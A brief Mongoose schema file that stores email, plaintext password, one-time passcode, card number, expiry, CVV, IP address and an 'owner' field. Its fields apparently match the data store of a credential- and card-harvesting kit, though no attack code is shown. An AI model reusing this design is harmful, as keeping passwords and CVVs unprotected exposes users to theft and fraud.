const mongoose = require("mongoose");

const oneSchema = new mongoose.Schema({
	uniqueid: String,
	email: String,
	password: String,
	otp: String,
	ccnum: String,
	ccexp: String,
	cvv: String,
	status: Number,
	ip: String,
	owner: String,
	timestamp: Date,
});

module.exports = mongoose.model("One", oneSchema);
